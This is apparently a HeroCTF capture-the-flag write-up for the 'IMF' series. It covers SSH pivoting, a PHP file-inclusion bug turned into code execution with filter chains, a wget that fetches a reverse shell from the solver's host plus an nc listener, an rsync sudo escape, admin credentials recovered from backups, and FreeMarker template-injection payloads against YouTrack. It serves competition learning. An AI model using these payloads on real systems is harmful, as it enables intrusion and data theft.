# IMF#0 Your mission, should you choose to accept it [368 solves] [50 points]

The flag is in the description :
```
Enter this flag to accept the mission : Hero{I_4cc3pt_th3_m1ss10n}
```

# IMF#1: Bug Hunting [99 solves] [68 points]

The credentials for SSH are given : `bob:password`

After logging in, we can see there's a `welcome.txt` in bob's home directory :

```
bob@dev:~$ ls -la
total 32
drwxr-x--- 1 bob  bob  4096 May 13 04:32 .
drwxr-xr-x 1 root root 4096 May 13 03:17 ..
-rw-r--r-- 1 bob  bob   220 May 13 03:17 .bash_logout
-rw-r--r-- 1 bob  bob  3771 May 13 03:17 .bashrc
drwx------ 2 bob  bob  4096 May 13 04:32 .cache
-rw-r--r-- 1 bob  bob   807 May 13 03:17 .profile
-rw-r--r-- 1 bob  bob  1293 May 12 10:16 welcome.txt
```

```
bob@dev:~$ cat welcome.txt 
Hi Bob!

Welcome to our firm. I'm Dave, the tech lead here. We are going to be working together on our app.

Unfortunately, I will be on leave when you arrive. So take the first few days to get familiar with our infrastructure, and tools.

We are using YouTrack as our main issue tracker. The app runs on this machine (port 8080). We are both going to use the "dev" account at first, but I will create a separate account for you later. There is also an admin account, but that's for our boss. The credentials are: "dev:aff6d5527753386eaf09".

The development server with the codebase is offline for a few days due to a hardware failure on our hosting provider's side, but don't worry about that for now.

We also have a backup server, that is supposed to backup the main app's code (but it doesn't at the time) and also the YouTrack configuration and data.

Only I have an account to access it, but you won't need it. If you really have to see if everything is running fine, I made a little utility that run's on a web server.

The command to check the logs is:
curl backup

The first backups might be messed up a bit, a lot bigger than the rest, they occured while I was setting up YouTrack with it's administration account.

Hope you find everything to you liking, and welcome again!

Dave
```

Dave said that, the machine is running YouTrack on port 8080 locally, and he gave us credentials for the dev account `dev:aff6d5527753386eaf09`, also there will be an admin account but it's for the boss

We can just do port forwarding with SSH and connect our browser to the socks proxy

```
ssh -p 14036 bob@dyn-04.heroctf.fr -D 1080
```

After entering the website, I can see that it is running a vulnerable version of YouTrack which is vulnerable to this :

https://www.synacktiv.com/publications/exploiting-cve-2021-25770-a-server-side-template-injection-in-youtrack.html

However we have to access the "Notification Templates" feature to exploit this, and we don't have permission to access that, I think we have to get the admin account before exploiting this

Viewing the issues on YouTrack, I found the flag for IMF#1 :

![](https://i.imgur.com/4EPARxx.png)


# IMF#2: A woman's weapon [47 solves] [405 points] [Second blood 🩸]

After getting the flag for IMF#1, on another issue, there's the PHP file of the backup log checking utility :

![](https://i.imgur.com/zVnIW8n.png)

```php
<?php
    $file = $_GET['file'];
    if(isset($file))
    {
        include("$file");
    }
    else
    {
        include("/var/log/backup.log");
    }
?>
```

This is vulnerable to LFI, which can be exploited to get RCE with PHP filter chain

This backup utility is mentioned in `welcome.txt` and we can access it with : 

```curl backup```

This should be the content of /var/log/backup.log of the backup machine :
```
bob@dev:~$ curl backup
05/11/23|20:24:02 [+] Data copied from dev machine
05/11/23|20:24:02 [+] Data from dev zipped (size:4998014)
05/11/23|20:25:01 [!] Failed to fetch data from dev machine
05/13/23|04:32:01 [+] Data copied from dev machine
05/13/23|04:32:02 [+] Data from dev zipped (size:865513)
05/13/23|04:33:01 [+] Data copied from dev machine
05/13/23|04:33:01 [+] Data from dev zipped (size:877071)
05/13/23|04:34:01 [+] Data copied from dev machine
05/13/23|04:34:01 [+] Data from dev zipped (size:877071)
05/13/23|04:35:02 [+] Data copied from dev machine
05/13/23|04:35:02 [+] Data from dev zipped (size:877071)
05/13/23|04:36:01 [+] Data copied from dev machine
05/13/23|04:36:01 [+] Data from dev zipped (size:877071)
05/13/23|04:37:02 [+] Data copied from dev machine
05/13/23|04:37:02 [+] Data from dev zipped (size:877071)
05/13/23|04:38:01 [+] Data copied from dev machine
05/13/23|04:38:01 [+] Data from dev zipped (size:877071)
```

We can just use the file GET parameter to do LFI, so we can use this to get RCE :

https://github.com/synacktiv/php_filter_chain_generator

First, generate the php filter chain :
```
# python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]);?>'
[+] The following gadget chain will generate the following code : <?php system($_GET["c"]);?> (base64 value: PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOz8+)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157
...
|convert.base64-decode/resource=php://temp
```

Then puse it on the file GET parameter to get RCE :
```
bob@dev:~$ curl 'backup?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode
...
|convert.base64-decode/resource=php://temp&c=ls+-la'|cat
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   442    0   442    0     0  43797      0 --:--:-- --:--:-- --:--:-- 49111
total 16
drwxr-xr-x 1 root     root     4096 May 12 18:17 .
drwxr-xr-x 1 root     root     4096 May 12 18:16 ..
-rw-r--r-- 1 root     root      612 May 12 18:16 index.nginx-debian.html
-rw-r--r-- 1 www-data www-data  155 May 12 10:16 index.php
```

We can see that have write permission on `index.php`, so we can overwrite it with a php reverse shell to get reverse shell :

```
bob@dev:~$ curl 'backup?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157
...
|convert.base64-decode/resource=php://temp&c=wget+http://<our address>/rev.php+-O+index.php'|cat
```

Then just setup a listener :
```
nc -nlvp 1337
```

As index.php is overwritten, we can just run `curl backup` to get the reverse shell

Then we will get a reverse shell as www-data on the backup machine

We can run `/usr/bin/rsync` as the `backup` user with sudo without password : 
```
(remote) www-data@backup:/$ sudo -l
Matching Defaults entries for www-data on backup:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on backup:
    (backup) NOPASSWD: /usr/bin/rsync
```

https://gtfobins.github.io/gtfobins/rsync/

```
www-data@backup:/$ sudo -u backup rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
backup@backup:/$ 
```

Then we have a shell as the backup user

```
backup@backup:/backup$ ls -la
total 10140
drwxrwx--- 1 backup backup   4096 May 13 04:42 .
drwxr-xr-x 1 root   root     4096 May 13 04:31 ..
-rwxr-xr-x 1 backup backup    760 May 12 10:16 backup.sh
-rwx------ 1 backup backup     38 May 12 18:17 flag.txt
-rw-r--r-- 1 dave   dave   691271 May 12 10:16 youtrack-1683836642.zip
-rw-rw-r-- 1 dave   dave   865513 May 13 04:32 youtrack-1683952321.zip
-rw-rw-r-- 1 dave   dave   877071 May 13 04:33 youtrack-1683952381.zip
-rw-rw-r-- 1 dave   dave   877071 May 13 04:34 youtrack-1683952441.zip
-rw-rw-r-- 1 dave   dave   877071 May 13 04:35 youtrack-1683952502.zip
-rw-rw-r-- 1 dave   dave   877071 May 13 04:36 youtrack-1683952561.zip
-rw-rw-r-- 1 dave   dave   877071 May 13 04:37 youtrack-1683952622.zip
-rw-rw-r-- 1 dave   dave   877071 May 13 04:38 youtrack-1683952681.zip
-rw-rw-r-- 1 dave   dave   877071 May 13 04:39 youtrack-1683952742.zip
-rw-rw-r-- 1 dave   dave   877071 May 13 04:40 youtrack-1683952801.zip
-rw-rw-r-- 1 dave   dave   877071 May 13 04:41 youtrack-1683952862.zip
-rw-rw-r-- 1 dave   dave   877071 May 13 04:42 youtrack-1683952921.zip
```

We can read the flag for IMF#2 in `/backup/flag.txt` :
```
backup@backup:/backup$ cat flag.txt
Hero{n0t_0nly_hum4ns_c4n_b3_po1s3n3d}
```

# IMF#3: admin:admin [34 solves] [451 points] [First blood 🩸]

There is the `backup.sh` file in /backup
```
cd /backup
mkdir -p youtrack/data/

scp -o StrictHostKeyChecking=no -r dave@dev:/opt/youtrack/conf youtrack/conf &&\
scp -o StrictHostKeyChecking=no -r dave@dev:/opt/youtrack/data/youtrack youtrack/data/youtrack

if [ $? -eq 0 ]; then
    echo "$(date "+%D|%T") [+] Data copied from dev machine" >> /var/log/backup.log

    name=youtrack-$(date +%s).zip
    zip -r $name youtrack
    if [ $? -eq 0 ]; then
        echo "$(date "+%D|%T") [+] Data from dev zipped (size:$(stat -c %s $name))" >> /var/log/backup.log
    else
        echo "$(date "+%D|%T") [!] Failed to zip data from dev" >> /var/log/backup.log
        exit 1
    fi
else
    echo "$(date "+%D|%T") [!] Failed to fetch data from dev machine" >> /var/log/backup.log
    exit 1
fi

rm -rf youtrack
```

It should be executed with cron job periodically, to use scp as Dave to copy data of YouTrack in the dev machine to this backup machine and create the zip files

After doing some googling, I found that the data/ directory should contains credentials for YouTrack

So I decompressed the oldest zip file, and found the password for admin :

```
conf/youtrack/service-config.properties:bundle.root-password=Th1sIsAV3ryS3cur3Adm1nP4ssw0rd0101#
```

Then we can go back to the dev machine and try to login YouTrack with this :
```
admin:Th1sIsAV3ryS3cur3Adm1nP4ssw0rd0101#
```

It worked, and now we have access to the "Notification Templates" feature :

http://10.99.190.3:8080/admin/notificationTemplates

First, we will select the issue to preview :

![](https://i.imgur.com/GmbIcMC.png)

Then enter one of the templates, and overwrite it with a SSTI payload :

![](https://i.imgur.com/MK2R544.png)

We can see that it's vulnerable to SSTI, so we can try to get RCE, we can just follow the guide by synacktiv

We can use this payload to execute `id` :

```
<#assign classloader=article.class.protectionDomain.classLoader><#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")><#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)><#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")>${dwf.newInstance(ec,null)(\"id\")}
```

Then in the response we can see the output of it :
```
{"issueId":"ST-5","output":"uid=1000(dave) gid=1000(dave) groups=1000(dave)\n","error":null,"$type":"NotificationPreview"}
```

We are executing it as dave, so we can try to find the flag for IMF#3 :

```
"<#assign classloader=article.class.protectionDomain.classLoader><#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")><#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)><#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")>${dwf.newInstance(ec,null)(\"ls -la /home/dave/\")}"
```

```
{"issueId":"ST-5","output":"total 44\ndrwxr-x--- 1 dave dave 4096 May 13 05:19 .\ndrwxr-xr-x 1 root root 4096 May 13 03:17 ..\n-rw-r--r-- 1 dave dave  257 May 12 10:17 .bash_history\n-rw-r--r-- 1 dave dave  220 May 13 03:17 .bash_logout\n-rw-r--r-- 1 dave dave 3771 May 13 03:17 .bashrc\ndrwx------ 2 dave dave 4096 May 13 05:19 .cache\n-rw-r--r-- 1 dave dave  807 May 13 03:17 .profile\ndrwxr-xr-x 2 dave dave 4096 May 13 03:17 .ssh\n-rwx------ 1 dave dave   52 May 13 03:18 flag.txt\n-rw-r--r-- 1 dave dave  736 May 12 10:17 randomfile.txt.enc\n","error":null,"$type":"NotificationPreview"}
```

The flag is in /home/dave/flag.txt

So we can just read it with this SSTI payload :

```
"<#assign classloader=article.class.protectionDomain.classLoader><#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")><#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)><#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")>${dwf.newInstance(ec,null)(\"cat /home/dave/flag.txt\")}"
```

Then we get the flag for IMF#3 :

```
{"issueId":"ST-5","output":"Hero{pl41nt3xt_p4ssw0rd_4nd_s5t1_b1t_much_41nt_1t?}\n","error":null,"$type":"NotificationPreview"}
```

# IMF#4: Put the past behind [33 solves] [454 points] [First blood 🩸]

We can just get a shell as dave from the SSTI for convenience

Then we can see there is a `randomfile.txt.enc` file
```
bash-5.1$ ls -la
total 44
drwxr-x--- 1 dave dave 4096 May 13 05:19 .
drwxr-xr-x 1 root root 4096 May 13 03:17 ..
-rw-r--r-- 1 dave dave  257 May 12 10:17 .bash_history
-rw-r--r-- 1 dave dave  220 May 13 03:17 .bash_logout
-rw-r--r-- 1 dave dave 3771 May 13 03:17 .bashrc
drwx------ 2 dave dave 4096 May 13 05:19 .cache
-rw-r--r-- 1 dave dave  807 May 13 03:17 .profile
drwxr-xr-x 2 dave dave 4096 May 13 03:17 .ssh
-rwx------ 1 dave dave   52 May 13 03:18 flag.txt
-rw-r--r-- 1 dave dave  736 May 12 10:17 randomfile.txt.enc
```

However, it is encrypted

But there is also `.bash_history`, with the size of 257, we can just read it :

```
dave@dev:~$ cat .bash_history 
whoami
ls
vim randomfile.txt
zip randomfile.zip randomfile.txt
vps=38.243.09.46
scp randomfile.txt dave@$vps:~/toSendToBuyer.txt
openssl aes-256-cbc -salt -k Sup3r53cr3tP4ssw0rd -in randomfile.txt -out randomfile.txt.enc
ls
rm randomfile.txt randomfile.zip
```

We can see that it is using openssl to encrypt the file with AES-256-CBC, and the password that derive the AES key is shown 

Then we can just decrypt the encrypted file

https://stackoverflow.com/questions/16056135/how-to-use-openssl-to-encrypt-decrypt-files

```
dave@dev:~$ openssl aes-256-cbc -d -salt -k Sup3r53cr3tP4ssw0rd -in randomfile.txt.enc -out dec.txt
*** WARNING : deprecated key derivation used.
Using -iter or -pbkdf2 would be better.
```

Then we can read the decrypted file and found the flag for IMF#4 :

```
dave@dev:~$ cat dec.txt 
Here is a sample of the hashes I dumped from the database, in good faith.

Pay up, and I'll send you the rest. Once you have you order, we never speak again. Glad doing business with you.

louis       afba3f2f6a6124ff952cdf8fa6d639ea
samantha    b92af75ee8a69de838e1d2eefc380bfb
joey        dfa3e5ccebaabe11bbde4b7f4de5bbd4
karl        219f9ad3f2efb75afcae7fab39fcd1aa
steve       f9df3a4453f27b8bfdd39ee96aca7bac
john        3d82b3ce57d8edfe2eaba8eb8eeebb3f
michael     84cae12ee0242ae4abb1e5fbaab40952
george      e58eddfd7a8d670ef5187c05b16b95a1
sarah       fdf4f0e12e7d4cd083abb61a4b7232d9
lucas       60d2fccbc0be51dc8dcd182b0b6a806f
sylvia      e4282d7ee69cab77bb41ec0e02598bad

Hero{4_l1ttle_h1st0ry_l3ss0n_4_u}
```